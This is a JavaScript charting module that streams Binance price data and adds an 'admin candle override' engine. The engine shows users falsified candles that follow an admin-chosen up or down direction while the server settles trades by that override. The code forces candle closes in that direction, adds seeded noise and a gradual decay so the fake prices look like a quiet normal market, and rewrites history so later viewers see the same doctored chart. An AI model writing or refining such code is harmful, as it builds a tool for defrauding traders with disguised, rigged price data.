// Helpers for smooth live candlestick charts.
//
// Why: Binance's @kline_* stream only pushes an update every ~2 seconds, so the current candle
// moves in visible steps. Binance's own app feels fluid because it updates the last candle on
// every trade tick. We do the same by also listening to @aggTrade and merging each tick into the
// current candle. Kline messages remain the source of truth for OHLC (they overwrite the candle
// whenever they arrive), so nothing drifts away from the real market data.

export const TF_SECONDS = { '1m': 60, '3m': 180, '5m': 300, '15m': 900, '30m': 1800, '1h': 3600, '2h': 7200, '4h': 14400, '6h': 21600, '12h': 43200, '1d': 86400 };

// Combined-stream URL: kline + aggTrade for one symbol
export function buildChartStreamUrl(symbol, interval = '1m') {
  const s = symbol.toLowerCase();
  return `wss://stream.binance.com:9443/stream?streams=${s}@kline_${interval}/${s}@aggTrade`;
}

// Deterministic pseudo-random in [0,1) from a numeric seed. Used so an admin override's
// drift/noise is STABLE for a given candle (instead of re-rolling on every tick, which made the
// last candle jitter up and down).
export function candleRand(seed) {
  const x = Math.sin(seed * 12.9898 + 78.233) * 43758.5453;
  return x - Math.floor(x);
}

// ─────────────────────────────────────────────────────────────────────────────
// Admin candle override — realistic, exact-to-the-second display model
//
// The server decides settlement from the override (unchanged). This module only decides what
// the chart SHOWS, and it must (a) obey the admin's direction from exactly `startsAt`, (b) look
// like a normal market, and (c) never contradict the direction on any full candle inside the
// window.
//
// Model: displayed price = real price × (1 + offset).
//   • inside the window  : offset drifts in the admin's direction (0.03–0.07 %/min, per-candle
//                          random but stable), capped at ±0.6 %, with a small smooth wobble.
//   • every full candle inside the window (start ≥ startsAt) is *enforced* to close on the
//                          admin's side of its open from its very first tick (body grows to
//                          0.015–0.04 % over ~40 s).
//                          Enforcement bumps `offset`, so later candles continue from there —
//                          no gaps between candles.
//   • outside the window : offset decays back to 0 (≈90 s), so the chart re-syncs with the
//                          real market gently (looks like a normal pull-back).
// The same engine replays recent history, so a user who opens the chart later sees the same
// story (raw candles are kept so a late-arriving override can re-shape them).
// ─────────────────────────────────────────────────────────────────────────────

export const OVERRIDE_MODEL = {
  // Kept deliberately small so candles look like a normal quiet market — the direction is
  // guaranteed, the size is not exaggerated (BTC @64k: ~$13–29 drift per minute).
  TREND_MIN: 0.0002, TREND_MAX: 0.00045,  // per minute
  MAX_OFFSET: 0.0035,                     // trend cap (enforcement may exceed)
  WOBBLE: 0.0001,                         // ± live wiggle
  DECAY_SEC: 150,                         // offset fades back to real over ~5 min after the window
  ENFORCE_AFTER_SEC: 0,                   // obey from the very first tick of the candle (no early float)
  ENFORCE_MIN: 0.0001, ENFORCE_MAX: 0.0003, // min body by ~40 s into the candle (0.01–0.03 %)
};

export function isOverrideActive(o, nowMs) { return !!o && o.startsAt <= nowMs && nowMs < o.endsAt; }
export function findActiveOverride(list, symbol, nowMs) {
  if (!Array.isArray(list)) return null;
  for (const o of list) if (o && o.symbol === symbol && isOverrideActive(o, nowMs)) return o;
  return null;
}
const overrideKey = (o) => `${o.symbol}|${o.startsAt}|${o.endsAt}|${o.direction}`;
const smoothstep = (x) => { x = Math.max(0, Math.min(1, x)); return x * x * (3 - 2 * x); };

/**
 * One engine per (symbol, timeframe). Keeps raw candles + the display offset.
 * @param {{ symbol: string, tfSec: number, timeOffsetSec: number }} cfg
 *   timeOffsetSec: what the page adds to Binance open-time to get chart time (PKT shift etc.)
 */
export function createOverrideEngine({ symbol, tfSec = 60, timeOffsetSec = 0 }) {
  const M = OVERRIDE_MODEL;
  let offset = 0;
  let lastMs = null;
  let cur = null;                       // { time, dispOpen, dispHigh, dispLow } for the candle being shaped
  const raw = new Map();                // time → real candle (bounded)
  const RAW_KEEP = 800;
  let shapedKeys = new Set();           // overrides already replayed into history

  const startMsOf = (c) => (c.time - timeOffsetSec) * 1000;
  const forSymbol = (list) => (Array.isArray(list) ? list.filter((o) => o && o.symbol === symbol) : []);

  function step(real, override, nowMs, maxDtSec) {
    const dt = lastMs == null ? 0 : Math.max(0, Math.min(maxDtSec, (nowMs - lastMs) / 1000));
    lastMs = nowMs;
    const dir = override ? (override.direction === 'up' ? 1 : -1) : 0;

    if (dir) {
      const rate = (M.TREND_MIN + candleRand(real.time + 3) * (M.TREND_MAX - M.TREND_MIN)) / 60;
      offset += dir * rate * dt;
      if (dir * offset > M.MAX_OFFSET) offset = dir * M.MAX_OFFSET;
    } else if (offset !== 0) {
      offset *= Math.exp(-dt / M.DECAY_SEC);
      if (Math.abs(offset) < 1e-7) offset = 0;
    }
    if (!dir && offset === 0) { cur = null; return real; }

    // Gentle live wiggle. Continuous in time (no per-candle phase jump) and scaled by how far the
    // display is from the real market, so it fades in at the window start and out with the decay.
    const wobble = M.WOBBLE * Math.min(1, Math.abs(offset) / 0.001) * Math.sin((nowMs / 1000) * 0.18);
    if (!cur || cur.time !== real.time) {
      cur = { time: real.time, dispOpen: real.open * (1 + offset + wobble), dispHigh: -Infinity, dispLow: Infinity };
    }
    let dispClose = real.close * (1 + offset + wobble);

    // Enforce direction on full candles inside the window (only meaningful on 1m charts)
    if (dir && tfSec <= 60) {
      const startMs = startMsOf(real);
      if (startMs >= override.startsAt - 500) {
        const elapsed = (nowMs - startMs) / 1000;
        if (elapsed >= M.ENFORCE_AFTER_SEC) {
          const target = M.ENFORCE_MIN + candleRand(real.time + 7) * (M.ENFORCE_MAX - M.ENFORCE_MIN);
          const m = cur.dispOpen * target * smoothstep((elapsed - M.ENFORCE_AFTER_SEC) / 40);
          if (dir * (dispClose - cur.dispOpen) < m) {
            dispClose = cur.dispOpen + dir * m;
            offset = dispClose / real.close - 1 - wobble; // persist → next candles continue from here
          }
        }
      }
    }
    const hi = Math.max(cur.dispOpen, dispClose, real.high * (1 + offset));
    const lo = Math.min(cur.dispOpen, dispClose, real.low * (1 + offset));
    cur.dispHigh = Math.max(cur.dispHigh, hi);
    cur.dispLow = Math.min(cur.dispLow, lo);
    return { ...real, open: cur.dispOpen, high: cur.dispHigh, low: cur.dispLow, close: dispClose };
  }

  function remember(c) {
    raw.set(c.time, c);
    if (raw.size > RAW_KEEP) { const first = raw.keys().next().value; raw.delete(first); }
  }

  /** Replay all remembered raw candles through a fresh state. Returns displayed candles. */
  function replay(list, nowMs) {
    const mine = forSymbol(list);
    offset = 0; lastMs = null; cur = null;
    shapedKeys = new Set(mine.filter((o) => o.startsAt <= nowMs).map(overrideKey));
    const candles = [...raw.values()].sort((a, b) => a.time - b.time);
    if (!mine.length) return candles;
    const out = new Array(candles.length);
    const SUB = tfSec <= 60 ? 6 : 4; // sub-steps per candle so the trend/decay evolve smoothly
    for (let i = 0; i < candles.length; i++) {
      const c = candles[i];
      const s0 = startMsOf(c);
      const sEnd = Math.min(s0 + tfSec * 1000 - 1, nowMs);
      let shown = c;
      for (let k = 1; k <= SUB; k++) {
        const t = s0 + ((sEnd - s0) * k) / SUB;
        shown = step(c, findActiveOverride(mine, symbol, t), t, tfSec);
      }
      out[i] = shown;
    }
    return out;
  }

  return {
    /** Real candles from REST → remembered + shaped. */
    seedHistory(candles, list, nowMs) { candles.forEach(remember); return replay(list, nowMs); },
    /** Live raw candle (kline / tick-merged) → displayed candle. */
    display(real, list, nowMs) { remember(real); return step(real, findActiveOverride(list, symbol, nowMs), nowMs, 5); },
    /** True when a past/active override for this symbol arrived that history wasn't shaped with. */
    needsReplay(list, nowMs) { return forSymbol(list).some((o) => o.startsAt <= nowMs && !shapedKeys.has(overrideKey(o))); },
    replay,
    /** True while the chart must keep redrawing even without new ticks (trend / decay animation). */
    animating(list, nowMs) { return offset !== 0 || !!findActiveOverride(list, symbol, nowMs); },
    get offset() { return offset; },
    firstRawTime() { let t = Infinity; for (const k of raw.keys()) if (k < t) t = k; return t; },
  };
}

// Merge a trade tick (price at tradeTimeMs) into the current candle.
// Returns the candle to draw, or null if the tick belongs to an older bucket (ignore).
// `bucketTime` = start of the tick's candle in the chart's time base (seconds, incl. offsets).
export function mergeTradeTick(lastCandle, price, bucketTime, qty = 0) {
  if (!Number.isFinite(price)) return null;
  const q = Number.isFinite(qty) ? qty : 0;
  if (!lastCandle || bucketTime > lastCandle.time) {
    // First tick of a new candle — open at the tick price until the kline stream confirms
    return { time: bucketTime, open: price, high: price, low: price, close: price, volume: q };
  }
  if (bucketTime < lastCandle.time) return null;
  return {
    ...lastCandle,
    close: price,
    high: Math.max(lastCandle.high, price),
    low: Math.min(lastCandle.low, price),
    volume: (Number(lastCandle.volume) || 0) + q,
  };
}
